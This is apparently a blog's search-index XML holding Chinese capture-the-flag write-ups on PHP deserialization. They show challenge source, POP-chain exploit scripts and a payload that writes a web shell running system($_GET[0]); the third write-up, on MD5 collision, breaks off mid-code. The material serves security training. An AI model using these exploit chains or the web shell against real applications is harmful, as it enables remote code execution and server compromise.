<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>论双括号-反序列化</title>
    <link href="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="EzUnserialize"><a href="#EzUnserialize" class="headerlink" title="EzUnserialize"></a>EzUnserialize</h2><p><strong>克拉玛依市第一届网络安全技能大赛-个人赛-Web</strong></p><p>题目源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Worker</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fwrite</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;fname&quot;</span>]))<span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;what is your filename???&quot;</span>);<br>        <span class="hljs-variable">$fname</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;fname&quot;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$fname</span>))&#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fname</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$fname</span>,<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your files are stored in <span class="hljs-subst">$fname</span>&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fremove</span>(<span class="hljs-params"><span class="hljs-variable">$fname</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$fname</span>))&#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fname</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Starter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$worker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;worker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">worker</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;mainDicHand !== <span class="hljs-literal">FALSE</span> )<br>        &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;worker-&gt;<span class="hljs-title function_ invoke__">fremove</span>( <span class="hljs-variable">$this</span>-&gt;mainDicHand );<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$invoke</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;invoke = <span class="hljs-string">&quot;var_dump&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$name</span> is not exists&quot;</span>.PHP_EOL;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;invoke))<br>        (<span class="hljs-variable language_">$this</span>-&gt;invoke)(<span class="hljs-variable">$args</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>遇到反序列化一定要会找关键点，此题的关键点在Worker类里面fwrite方法，这个方法可以往服务器里写入一个文件</p><ul><li>文件名是通过post传参进来的</li><li>文件内容是通过调用fwrite方法时，传入进来</li></ul><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211004420410.png" alt="image-20230211004420410"></p><p>看明白这个fwrite方法以后，我们就可以开始寻找从那里能够调用这个fwrite方法</p><ul><li>Helper类里的__call魔术方法里的($this-&gt;invoke)($args)可以调用，并且能够传入文件内容</li></ul><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211004652804.png" alt="image-20230211004652804"></p><p>那么接下来我们就可以直接构造payload了</p><p>首先将Helper类赋值给Starter类里面的worker，这样就可以触发__call方法了</p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005129705.png" alt="image-20230211005129705"></p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005136968.png" alt="image-20230211005136968"></p><p>反序列化时当跑到__call魔术方法时，$name就是fremove，$args就是$this-&gt;mainDicHand，而$this-&gt;mainDicHand是我们要传入的文件内容，所以我们还要给mainDicHand赋值</p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005336312.png" alt="image-20230211005336312"></p><p>再往下进行了if判断，判断$this-&gt;invoke必须是数组，这里牵扯到数组调用类里面的方法</p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005447753.png" alt="image-20230211005447753"></p><p>最后的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Starter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$worker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mainDicHand</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$invoke</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Worker</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fwrite</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;fname&quot;</span>]))<span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;what is your filename???&quot;</span>);<br>        <span class="hljs-variable">$fname</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;fname&quot;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$fname</span>))&#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fname</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$fname</span>,<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your files are stored in <span class="hljs-subst">$fname</span>&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fremove</span>(<span class="hljs-params"><span class="hljs-variable">$fname</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$fname</span>))&#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fname</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$s1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Starter</span>;<br><span class="hljs-variable">$h1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br><span class="hljs-variable">$w1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>;<br><span class="hljs-variable">$s1</span>-&gt;worker = <span class="hljs-variable">$h1</span>;<br><span class="hljs-variable">$s1</span>-&gt;mainDicHand = <span class="hljs-string">&quot;&lt;?php phpinfo();system(\$_GET[0]);?&gt;&quot;</span>;<br><span class="hljs-variable">$h1</span>-&gt;invoke = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$w1</span>,<span class="hljs-string">&quot;fwrite&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s1</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>效果</p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005538156.png" alt="image-20230211005538156"></p><p><img src="/2023/02/11/%E8%AE%BA%E5%8F%8C%E6%8B%AC%E5%8F%B7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230211005551524.png" alt="image-20230211005551524"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF,反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回首popt</title>
    <link href="/2022/12/30/%E5%9B%9E%E9%A6%96popt/"/>
    <url>/2022/12/30/%E5%9B%9E%E9%A6%96popt/</url>
    
    <content type="html"><![CDATA[<p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;checkAccess, <span class="hljs-string">&#x27;cmd&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error path&quot;</span>;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">switch</span>(<span class="hljs-variable language_">$this</span>-&gt;id) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;checkAccess) &#123;<br>                        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;checkAccess.<span class="hljs-string">&quot;.php&quot;</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Content</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\InvalidArgumentException</span>(<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFormatter</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str-&gt;<span class="hljs-title function_ invoke__">reset</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|phar|http|file|ftp|dict|data|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;invalid protocol found in &#x27;</span>.<span class="hljs-keyword">__CLASS__</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;reader !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题是通过$_POST[0]传入序列化数据，然后进行反序列化。下面我们开始找执行点，以及反推的加正向思维的串联。</p><p>代码执行的地方一定是在</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230155705194.png" alt="image-20221230155705194"></p><p>往上看一点，当$this-&gt;id为1时，才能进行文件包含，而且这里的文件包含限制了文件后缀，必须是.php</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230155808792.png" alt="image-20221230155808792"></p><p>再往上面看，$this-&gt;id不等于0也不能等于1(强类型比较)，但是也可以发现下面的switch是弱比较，所以这里的$this-&gt;id我们可以改为true。</p><p>那么下面怎么去调用run函数呢，毕竟只有调用run函数了才能进行文件包含的操作。调用run函数的地方在这里</p><p>Content类里面的__call()魔术方法   在对象中调用一个不可访问方法时，__call会被调用</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230160151001.png" alt="image-20221230160151001"></p><p>哪里可以调用call魔术方法呢，在Show类里面的__toString魔术方法，将$this-&gt;str赋值成Content新建类。</p><p>Show类里面的__toString()魔术方法  用于定义一个类被当成字符串时该如何处理</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230160518269.png" alt="image-20221230160518269"></p><p>怎么调用__toString，这里呢，可以利用到它自身的__wakeup魔术方法，这个魔术方法里面有用到preg_match函数，这个函数是针对字符串进行过滤的，所以我们只需要将$this-&gt;source赋值成Show新建类就行了，至此一个pop链就构造完成了</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230160908445.png" alt="image-20221230160908445"></p><p>下面还牵扯到了一个新知识，就是通过iconv将任意一个文件里的内容转换成一句话木马的方式。</p><p>这是参考链接<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$checkAccess</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-variable">$checkAccess</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-variable">$id</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Content</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;formatters = <span class="hljs-variable">$formatters</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>&#125;<br><br><span class="hljs-variable">$s1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$s2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$s1</span>-&gt;source=<span class="hljs-variable">$s2</span>;<br><span class="hljs-variable">$s2</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Content</span>([<span class="hljs-string">&#x27;reset&#x27;</span> =&gt; [(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Action</span>(<span class="hljs-string">&quot;这里是include的地方&quot;</span>, <span class="hljs-literal">true</span>)), <span class="hljs-string">&#x27;run&#x27;</span>]]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s1</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造一个iconv payload</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230161655222.png" alt="image-20221230161655222"></p><p>然后将这一串，复制到new Action(“这里是include的地方”),接着运行exp，将序列化的数据提交一下</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230162111758.png" alt="image-20221230162111758"></p><p>最后查看flag</p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230162358688.png" alt="image-20221230162358688"></p><p><img src="/2022/12/30/%E5%9B%9E%E9%A6%96popt/image-20221230162415859.png" alt="image-20221230162415859"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化+MD5碰撞</title>
    <link href="/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/"/>
    <url>/2022/12/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MD5%E7%A2%B0%E6%92%9E/</url>
    
    <content type="html"><![CDATA[<p>题目源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y</span>;<br><br>    <span class="hljs-keyword">public</span> <span 